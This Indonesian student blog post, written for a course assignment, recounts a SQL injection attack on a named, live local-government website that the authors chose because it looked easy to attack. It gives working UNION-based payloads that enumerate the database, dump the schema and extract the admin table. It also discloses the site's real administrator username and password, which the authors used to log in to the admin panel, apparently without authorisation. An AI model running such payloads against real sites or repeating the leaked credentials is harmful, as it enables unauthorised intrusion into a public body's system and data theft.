---
layout: post
title: Web Attack
date: 2016-11-30
summary: Silakan klik pada judul untuk detailnya
categories: tugas
---


**Oleh: 

Johan 13514026

Kevin Supendi 13514094**

---------------

### Daftar Isi

>* [Abstraksi] (#abstraksi)
>* [Pendahuluan] (#pendahuluan)
>* [Dasar Teori](#dasar)
>* [Skenario Pengujian] (#skenario)
>* [Kesimpulan] (#kesimpulan)

---------------


### <a name="abstraksi"></a>**ABSTRAKSI**
Saat ini, kemudahan mengakses internet membuat website yang ada berjumlah sangat banyak. Tetapi website yang ada belum tentu memiliki keamanan yang bagus. Padahal, keamanan merupakan hal terpenting yang wajib ada dalam pembuatan web. Pada makalah ini akan diberikan contoh mencari celah keamanan suatu website agar nantinya bisa menjadi masukan bagi pembuat website untuk lebih memperhatikan dan meingkatkan keamanan suatu website yang akan dibuat

### <a name="pendahuluan"></a>**PENDAHULUAN**
Dalam era teknologi seperti sekarang ini perkembangan teknologi telekomunikasi dan penyimpanan data yang menggunakan komputer memungkinkan pengiriman data jarak jauh  merupakan salah satu metode cepat dan relatif murah. Namun pengiriman data jarak jauh seperti ini yang biasa menggunakan sarana internet ataupun berupa gelombang radio dan media lain, tidak menjamin keamanan pada data tersebut. Akan sangat memungkinkan adanya pihak lain yang dapat menyadap dan mengubah data yang dikirim. Sehingga data yang diterima akan merubah atau bahkan akan hilang, tidak diterima oleh si penerima.

Namun kebanyakan dari mereka pemilik website mengabaikan security system website tersebut. Sehingga ada kalanya para Hacker/Cracker mengacak-acak website yang tertata rapih. Betapa pentingnya keamanan yang harus dijaga dalam sebuah website agar tetap nyaman dikunjungi user yang menggunakan Internet. Sehingga kami bermaksud meberikan contoh hacking sebuah website.

### <a name="dasar"></a>**DASAR TEORI**
Website merupakan kumpulan halaman yang menampilkan informasi data teks, gambar, animasi, suara, video atau gabungan dari semuanya yang saling terkait dimana masing-masing dihubungkan dengan jaringan-jaringan halaman (hyperlink). Keamanan suatu website merupakan salah satu prioritas utama bagi seorang webmaster. Jika seorang webmaster mengabaikan keamanan suatu website, maka hacker akan dapat mengambil data-data penting pada suatu website dan bahkan pula dapat mengacak-acak tampilan website tersebut (deface). 

Banyak sekali kasis website di-hack, di-deface, dan isi databasenya bisa ada yang hilang. Blog gratisan atau bahkan website pemerintahan pun sering menjadi sasaran para hacker. 

Ada beberapa metode yang biasa digunakan para hacker untuk menyerang suatu website:
* Remote File Inclusion (RFI)
Metode ini biasanya memanfaatkan kelemahan script php. Dengan RFI, seseorang dapat menginclude kan file yang berada di luar server yang bersangkutan
* Local File Inclusion (LFI)
Mirip seperti RFI
* SQL Injection
SQLi adalah teknik yang memanfaatkan kesalahan penulisan query sql pada suatu website sehingga seorang dapat memasukan beberapa sql statement lagi ke dalam query dengan cara memanipulasi data input ke aplikasi tersebut.
* Cross Site Scripting (XSS)
XSS adalah suatu metode memasukan code atau script HTML ke dalam suatu website yang dijalankan melalui browser di client

### <a name="skenario"></a> **Skenario Pengujian**
Pertama kami mencari situs web yang mudah diserang. Kami menemukan situs Dinas Koperasi dan UMKM. Di dalamnya terdapat search box yang kelihatannya mudah diserang dengan SQL Injection
![Alt text](https://raw.githubusercontent.com/Johansentosa/Tugas-quiz-IF3130-Web-Attack/master/images/home.png "tampilan homepage")

![Alt text](https://raw.githubusercontent.com/Johansentosa/Tugas-quiz-IF3130-Web-Attack/master/images/search.png "search box")

Pertama kami mencoba memasukkan tanda kutip. Jika query statement tidak dihandle dengan baik, input tanda kutip dapat merusak sql query dan menghasilkan pesan error.
![Alt text](https://raw.githubusercontent.com/Johansentosa/Tugas-quiz-IF3130-Web-Attack/master/images/kutip2.png "Input search dengan kutip 2'"'")
Kutip dua tidak menghasilkan apa-apa

![Alt text](https://raw.githubusercontent.com/Johansentosa/Tugas-quiz-IF3130-Web-Attack/master/images/kutip1.png "Input search dengan kutip 1")
Kutip satu menghasilkan error.

Lalu kita coba untuk melihat hasil kutip 1 jika diescape.
![Alt text](https://raw.githubusercontent.com/Johansentosa/Tugas-quiz-IF3130-Web-Attack/master/images/escape.png "Input search dengan kutip 1 dan diescape")
Input dengan kutip satu yang diescape akan menghasilkan sesuatu. Ini berarti search box dapat diserang dengan SQL Injection.

Kemudian kami menebak struktur SELECT query yang dipakai, caranya dengan UNION. Semua hasil SELECT query dapat di UNION dengan query berkolom sama.

> Kami mencoba beberapa kali input untuk mencari jumlah kolom yang sesuai. Contoh : 
> ' or 1=1 limit 1 union select 'a', 'a'#
> ' or 1=1 limit 1 union select 'a', 'a', ’a’#
> ' or 1=1 limit 1 union select 'a', 'a', ’a’, ’a’, 'a'#
> Sampai akhirnya input mengeluarkan hasil
> ' or 1=1 limit 1 union select 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a'#

![Alt text](https://raw.githubusercontent.com/Johansentosa/Tugas-quiz-IF3130-Web-Attack/master/images/hasila.png "Input search mengeluarkan hasil")

Hasil item kedua adalah ‘a’, ini berarti query berhasil.
Kemudian kami memakai subquery menggantikan salah satu karakter a, untuk membocorkan informasi tabel dan kolom dari seluruh database. Hal ini mungkin dilakukan dengan menggunakan information_schema.

> ' or 1=1 limit 1 union select 'a', 'a', 'a', (select database()), 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a'#

![Alt text](https://raw.githubusercontent.com/Johansentosa/Tugas-quiz-IF3130-Web-Attack/master/images/database.png "Hasil nama database")
Nama database adalah : **c2infokumkm**

Kemudian dengan group_concat, dapat memunculkan tabel dalam information schema.
> ' or 1=1 limit 1 union select 'a', 'a', 'a', (select group_concat(table_name) from information_schema.tables WHERE table_schema=database()), 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a'#

![Alt text](https://raw.githubusercontent.com/Johansentosa/Tugas-quiz-IF3130-Web-Attack/master/images/table.png "Hasil daftar nama tabel")

Namun sepertinya masih banyak tabel yang belum ditampilkan, ini karena group_concat mempunyai limitasi 1024 byte, tetapi limitasi ini juga bisa dibypass. Kami kemudian mencari query di internet untuk dump seluruh isi database.
> ' or 1=1 limit 1 union select 'a', 'a', 'a', concat('<font color=red size=4>ur name <br> ',version(),'<br>',user(),'<br>',database(),(select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(table_schema=database())and(@:=concat(@,'<br>','<font color=green size=3>',table_name,'</font> ','  ::  ','<font color=blue size=3>',column_name))),@)))), 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a'#

hasilnya sebagai berikut
![Alt text](https://raw.githubusercontent.com/Johansentosa/Tugas-quiz-IF3130-Web-Attack/master/images/kolom1.png "Hasil daftar nama tabel beserta kolom")
![Alt text](https://raw.githubusercontent.com/Johansentosa/Tugas-quiz-IF3130-Web-Attack/master/images/kolom2.png "Hasil daftar nama tabel beserta kolom")

Ada sekitar 50 tabel yang bisa diambil datanya. Ada juga kolom-kolom menarik seperti username, password, email dan lainnya.
Setelah melihat-lihat, tidak ada akses menuju login user di homepage, karena itu kami mencurigai adanya login page di url tersembunyi. Ternyata benar saja, ada login.php

![Alt text](https://raw.githubusercontent.com/Johansentosa/Tugas-quiz-IF3130-Web-Attack/master/images/login.png "Halaman login.php")

Tentu saja kami harus mencari username dan password dari database terlebih dahulu.

> Username :
> ' or 1=1 limit 1 union select 'a', 'a', 'a', (select group_concat(tblpengguna_login) FROM c2infokumkm.tblpengguna), 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a'#
> Password :
> ' or 1=1 limit 1 union select 'a', 'a', 'a', (select group_concat(tblpengguna_pass) FROM c2infokumkm.tblpengguna), 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a'#

Didapatkan username : “administrator” dan password  : “dinkop123”, kemudian kami dapat login ke dalam admin page.
![Alt text](https://raw.githubusercontent.com/Johansentosa/Tugas-quiz-IF3130-Web-Attack/master/images/admin.png "Halaman administrator")

Pada menu ini kami dapat melakukan banyak hal, menambah admin baru, mengganti password admin, menambah data, menghapus data, dan lain sebagainya. Tentu saja hal-hal ini tidak kami lakukan :)


### <a name="kesimpulan"></a>**KESIMPULAN**
Dalam makalah ini, kami mencoba untuk melakukan attack pada website http://infokumkm.surakarta.go.id/home.php. Halaman utama website ini merupakan file php, karena ditandai dengan extension url home.php. Dengan adanya file php, pasti akan ada SQL untuk menyimpan  database. Dan kami langsung mencoba mencari celah, untuk melakukan SQL Injection. Celah tersebut biasanya selalu ada pada fitur input text untuk melakukan pencarian atau login. Kami mendapat fitur pencarian. Benar saja, website ini dapat dilakukan sql Injection. 

Kami ingin membuktikan, bahwa hanya dengan 1 celah kecil, akan dapat berakibat fatal pada suatu website. Seperti merubah tampilan website tersebut atau bahkan, mengambil data-data user yang penting (email, password, dll). Oleh karena itu, website master harus berusaha menutup semua celah keamanan yang ada untuk mencegah terkena hack. 

Ada banyak cara yang dapat digunakan untuk mencegah terjadinya hack
- melakukan enkripsi dan dekripsi data
- update CMS dan plugin yang digunakan
- cek akses server website
- rutin melakukan backup
- mengatur permission

Webmaster harus mencari semua celah keamanan untuk memperbaiki websitenya, tetapi Hacker hanya butuh mencari 1 lubang keamanan untuk dapat menghancurkan website tersebut.
